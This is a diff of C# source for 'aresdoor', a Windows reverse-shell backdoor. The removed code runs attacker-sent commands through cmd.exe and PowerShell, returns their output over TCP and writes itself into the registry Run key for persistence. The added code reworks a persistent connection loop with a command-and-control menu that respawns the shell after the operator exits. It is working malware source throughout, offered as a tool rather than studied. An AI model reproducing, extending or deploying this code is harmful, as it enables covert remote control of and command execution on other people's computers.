@@ -1,119 +1,7 @@
 ﻿using System;
-using System.Net;
-using System.Net.Sockets;
 
 namespace aresdoor
 {
-    class Networking
-    {
-        /* Check connection to a defined server */
-        public static bool checkInternetConn(string server)
-        {
-            try
-            {
-                using (System.Net.NetworkInformation.Ping pingSender = new System.Net.NetworkInformation.Ping())
-                {
-                    System.Net.NetworkInformation.PingReply reply = pingSender.Send(server);
-                    return reply.Status == System.Net.NetworkInformation.IPStatus.Success ? true : false;
-                }
-            }
-            catch (Exception) { return false; }
-        }
-
-        /* Resolve hostname to the first IP address that shows in the array */
-        public static string resolveHostName(string hostname)
-        {
-            IPAddress[] addressList = Dns.GetHostAddresses(hostname);
-            return addressList[0].ToString();
-        }
-    }
-
-    class Misc
-    {
-        /* Execute commands via command prompt */
-        public static string execCommandPrompt(string cmd)
-        {
-            System.Diagnostics.Process p = new System.Diagnostics.Process();
-            p.StartInfo.UseShellExecute = false;
-            p.StartInfo.RedirectStandardOutput = true;
-            p.StartInfo.FileName = "cmd.exe";
-            p.StartInfo.Arguments = "/C " + cmd;
-            p.Start();
-
-            // To avoid deadlocks, always read the output stream first and then wait.
-            string output = p.StandardOutput.ReadToEnd();
-            p.WaitForExit();
-
-            return output; // return output of command
-        }
-
-        /* Execute commands via powershell */
-        public static string execPowershellCommand(string cmd)
-        {
-            System.Diagnostics.Process p = new System.Diagnostics.Process();
-            p.StartInfo.UseShellExecute = false;
-            p.StartInfo.RedirectStandardOutput = true;
-            p.StartInfo.FileName = "powershell.exe";
-            p.StartInfo.Arguments = "/C " + cmd;
-            p.Start();
-
-            // To avoid deadlocks, always read the output stream first and then wait.
-            string output = p.StandardOutput.ReadToEnd();
-            p.WaitForExit();
-
-            return output; // return output of command
-        }
-
-        /* Convert string to a byte array */
-        public static byte[] byteCode(string contents)
-        { return System.Text.Encoding.ASCII.GetBytes(contents); }
-
-        /* Append current executing assembly to the autorun registration in Windows. */
-        public static void SetStartup()
-        {
-            Microsoft.Win32.RegistryKey rk = Microsoft.Win32.Registry.CurrentUser.OpenSubKey
-                ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
-
-            string currfile = System.Reflection.Assembly.GetExecutingAssembly().Location;
-            rk.SetValue(System.IO.Path.GetFileName(currfile), currfile);
-        }
-    }
-
-    class NetworkCommunication
-    {
-        public bool dataTravelTO(NetworkStream stream, string rawDataToSend)
-        {
-            try
-            {
-                byte[] dataToSend = Misc.byteCode(rawDataToSend);
-                stream.Write(dataToSend, 0, dataToSend.Length); // Send data
-
-                return true; // if we got here then it worked!
-            #if DEBUG
-                } catch (Exception exc)
-                { Console.WriteLine(exc.Message); return false; }
-            #else
-                } catch (Exception)
-                { return false; }
-            #endif
-        }
-
-        public string dataTravelFROM(NetworkStream stream)
-        {
-            int bytes = default(int);
-            byte[] tcpdata = new byte[256];
-
-            try { bytes = stream.Read(tcpdata, 0, tcpdata.Length); } // Read TCP data from stream
-            #if DEBUG
-                catch (Exception exc) { Console.WriteLine(exc.Message); }
-            #else
-                catch (Exception) { }
-            #endif
-
-            return System.Text.Encoding.ASCII.GetString(tcpdata, 0, bytes);
-        }
-    }
-
     class Program
     {
         private static string shellcode_ = System.IO.Directory.GetCurrentDirectory() + "> ";
@@ -123,56 +11,7 @@ namespace aresdoor
         private static string server = "localhost";
         private static int port = 9000;
         private static bool prevent_shutdown = false;
-
-        private static void sendBackdoor(string server, int port)
-        {
-            try
-            {
-                System.Net.Sockets.TcpClient client = new System.Net.Sockets.TcpClient(server, port);
-                System.Net.Sockets.NetworkStream stream = client.GetStream();
-                string responseData;
-               
-                while (true)
-                {
-                    byte[] shellcode = Misc.byteCode(System.IO.Directory.GetCurrentDirectory() + "> ");
-
-                    stream.Write(shellcode, 0, shellcode.Length); // Send Shellcode
-                    byte[] data = new byte[256]; byte[] output = Misc.byteCode("");
-
-                    // String to store the response ASCII representation.
-                    
-                    int bytes = stream.Read(data, 0, data.Length);
-                    responseData = System.Text.Encoding.ASCII.GetString(data, 0, bytes);
-
-                    if (responseData.Contains("cd"))
-                        System.IO.Directory.SetCurrentDirectory(responseData.Split(" ".ToCharArray())[1]);
-                    else if (responseData.Contains("setStartup"))
-                    {
-                        Misc.SetStartup();
-                        output = Misc.byteCode("Application added to startup registry.\n");
-                    }
-                    else
-                        try { output = Misc.byteCode(Misc.execCommandPrompt(responseData)); } catch (Exception) { output = Misc.byteCode("Command couldn't execute."); }
-
-                    try
-                    { stream.Write(output, 0, output.Length); } // Send output of command back to attacker.
-                    catch (System.IO.IOException)
-                    {
-                        stream.Close();
-                        client.Close();
-                        break;
-                    }
-                }
-
-                // Close everything.
-                stream.Close();
-                client.Close();
-            }
-            catch (System.Net.Sockets.SocketException) { } // Pass socket connection silently.
-            catch (Exception exc) { Console.WriteLine(exc.Message); }
-        }
-       
-
+        
         static void Main(string[] args)
         {
             /*
@@ -220,6 +59,8 @@ namespace aresdoor
             }
 
             /* Persistant backdoor connection */
+            persistantBackdoor:
+
             #if DEBUG
             while (true)
             {
@@ -230,8 +71,7 @@ namespace aresdoor
                         Console.WriteLine("Sending backdoor to: {0}, port: {1}", server, port);
 
                         // Define a couple of variables that set our connection target
-                        TcpClient client = new System.Net.Sockets.TcpClient(server, port);
-                        NetworkStream stream = client.GetStream();
+                        System.Net.Sockets.TcpClient tcpClient = new System.Net.Sockets.TcpClient(server, port);
 
                         // Custom class/method instances
                         NetworkCommunication nc = new NetworkCommunication();
@@ -256,36 +96,39 @@ namespace aresdoor
                             aresdoorStartMenu += " 2) Powershell Backdoor\n";
                             aresdoorStartMenu += " 3) Exit\n\n";
                             
-                            nc.dataTravelTO(stream, "\n" + aresdoorStartMenu);
+                            nc.DataTravelTO(tcpClient, "\n" + aresdoorStartMenu);
 
                             optionInputDisplay: // Define a mark for requesting an option to be inputted
-                            nc.dataTravelTO(stream, "aresdoor> ");
+                            nc.DataTravelTO(tcpClient, "aresdoor> ");
                             
                             // Wait for a response
-                            responseFromServer = nc.dataTravelFROM(stream);
+                            responseFromServer = nc.DataTravelFROM(tcpClient);
                             responseFromServer = responseFromServer.Replace("\n", string.Empty).Replace(" ", string.Empty);
 
                             if (responseFromServer == "1")
                             {
-                                nc.dataTravelTO(stream, "You've selected 'Command Prompt Backdoor'\n");
-                                while (bc.CommandPromptBackdoor(stream)) { }
+                                while (bc.CommandPromptBackdoor(tcpClient)) { }
                                 goto candcmenu;                                
                             }
                             else if (responseFromServer == "2")
                             {
-                                nc.dataTravelTO(stream, "You've selected 'Powershell Backdoor'\n");
-                                while (bc.PowershellBackdoor(stream)) { }
+                                while (bc.PowershellBackdoor(tcpClient)) { }
                                 goto candcmenu;
                             }
                             else if (responseFromServer == "3" || responseFromServer == "exit")
                             {
-                                nc.dataTravelTO(stream, "You've selected 'Exit'\n");
+                                nc.DataTravelTO(tcpClient, "Closing TCP Connection... You have 5 seconds before another shell is spawned.\n");
+
+                                nc.CloseTCPStream(tcpClient);
+
+                                System.Threading.Thread.Sleep(5000);
+                                goto persistantBackdoor;
                             }
                             else if (responseFromServer == "")
                                 goto optionInputDisplay;
                             else
                             {
-                                nc.dataTravelTO(stream, "Sorry, \"" + responseFromServer + "\" is not a recognized command.\n");
+                                nc.DataTravelTO(tcpClient, "Sorry, \"" + responseFromServer + "\" is not a recognized command.\n");
                                 goto optionInputDisplay;
                             }
                         }
@@ -293,7 +136,7 @@ namespace aresdoor
                         // sendBackdoor(server, port);
                     }
                     catch (Exception exc)
-                    { Console.WriteLine(exc.Message); } // pass silently unless debug mode is enabled
+                    { Console.WriteLine(exc.Message); goto persistantBackdoor; } // pass silently unless debug mode is enabled
                 }
                 else
                 { Console.WriteLine("Couldn't connect to {0}:{1}. Retrying in 5 seconds...", Networking.resolveHostName(server), port); }
